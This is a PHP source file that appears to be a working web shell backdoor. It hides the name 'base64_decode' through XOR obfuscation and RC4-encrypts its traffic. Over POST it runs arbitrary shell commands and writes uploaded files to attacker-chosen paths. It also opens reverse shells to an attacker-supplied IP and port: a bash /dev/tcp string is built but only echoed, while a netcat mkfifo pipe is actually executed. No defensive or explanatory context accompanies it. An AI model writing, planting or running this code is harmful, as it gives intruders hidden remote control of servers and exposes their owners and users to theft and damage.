<?php 


$_ = "{";
$_B_ = ($_ ^ chr('57')).($_ ^ chr('58')).($_ ^ chr('40')).($_ ^ chr('62')).($_ ^ chr('77')).($_ ^ chr('79')).($_ ^ chr('36')).($_ ^ chr('63')).($_ ^ chr('62')).($_ ^ chr('56')).($_ ^ chr('52')).($_ ^ chr('63')).($_ ^ chr('62'));
$_____K_____ = $_B_("Y25zM2NfcDRzd2Q=");

// $__ = ($_ ^ chr('24')).($_ ^ chr('9')).($_ ^ chr('30')).($_ ^ chr('26')).($_ ^ chr('15')).($_ ^ chr('30')).($_ ^ chr('36')).($_ ^ chr('29')).($_ ^ chr('14')).($_ ^ chr('21')).($_ ^ chr('24')).($_ ^ chr('15')).($_ ^ chr('18')).($_ ^ chr('20')).($_ ^ chr('21'));
// $___ = ($_ ^ chr('51')).($_ ^ chr('47')).($_ ^ chr('47')).($_ ^ chr('43')).($_ ^ chr('36')).($_ ^ chr('56')).($_ ^ chr('52')).($_ ^ chr('63')).($_ ^ chr('62'));
// $_X_ = $__(null, $_B_($_SERVER[$___]));
// $_X_();


//    DELETE .....................

// Algorithm RC4
function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}

function encrypt($text){
	global $_____K_____;
	return base64_encode(rc4($_____K_____, $text));
}

function decrypt($cipher){
	global $_____K_____;
	return rc4($_____K_____, base64_decode($cipher));
}

// Execute command
if (isset($_POST['password']) && !empty($_POST['password'])){
	$cmd = decrypt($_POST['password']);
	$output = shell_exec($cmd);
	echo encrypt($output);
	return;
}

// Upload file
if (isset($_POST['f']) && !empty($_POST['f']) && 
	isset($_FILES['data_upload']) && $_FILES['data_upload']['size'] > 0){

	// Decode input
	$filename 	= 	decrypt($_FILES['data_upload']['name']);
	$folder 	= 	decrypt($_POST['f']);
	$data 		= 	decrypt(file_get_contents($_FILES['data_upload']['tmp_name']));

	// Condition
	if (file_exists($folder . $filename)){
		echo encrypt("File exists.");
		return;
	}
	if (strlen($data) == 0){
		echo encrypt("Decryption data has been fail.");
		return;
	}

	// Handle
	file_put_contents($folder . $filename, $data);
	// Can kiem tra su thanh cong cua upload

	// Encode output
	echo encrypt($filename . " has been upoaded.");
	return;
}

// Reverse shell using bash
if (isset($_POST['ip']) 	&& !empty($_POST['ip']) 	&&
	isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
	isset($_POST['re_bash'])) {

	// Decode input
	$ip = decrypt($_POST['ip']);
	$port = decrypt($_POST['port']);

	// Handle
	$reverse_str = "/bin/bash -i >& /dev/tcp/{$ip}/{$port} 0>&1";
	echo $reverse_str;
	// shell_exec($reverse_str);
	return;
}

// Reverse shell using netcat
if (isset($_POST['ip']) 	&& !empty($_POST['ip']) 	&&
	isset($_POST['port']) 	&& !empty($_POST['port']) 	&&
	isset($_POST['re_netcat'])) {

	// Decode input
	$ip = decrypt($_POST['ip']);
	$port = decrypt($_POST['port']);

	// Handle
	$reverse_str = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/f";
	echo $reverse_str;
	shell_exec($reverse_str);
	return;
}

 ?>